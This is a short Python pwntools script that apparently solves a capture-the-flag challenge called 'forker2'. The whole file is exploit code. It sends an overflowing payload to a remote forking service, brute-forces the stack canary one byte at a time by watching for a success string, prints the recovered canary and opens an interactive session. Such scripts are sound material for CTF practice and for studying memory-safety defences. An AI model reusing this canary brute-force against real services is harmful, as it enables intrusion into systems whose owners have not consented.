#!/usr/bin/env python

from pwn import *
import struct
import threading

payload = 'INTERNET_FUNNY_MUNNY\x00' + 'A' * (72 - 21)
canary = ['\x00'] * 8

for i in range(8):
    for ch in range(256):
        if ch == 10:
            continue

        p = remote('forker2.wpictf.xyz', 31337)

        p.sendline(payload + chr(ch))

        time.sleep(1)

        if 'LNpECGn9in6BGC8eaK87QawjzAXaWMht2b' in p.recv():
            canary[i] = chr(ch)
            print '-----------------', hex(struct.unpack('<Q', ''.join(canary))[0])
            payload += chr(ch)
            break

print hex(struct.unpack('<Q', ''.join(canary))[0])

p.interactive()

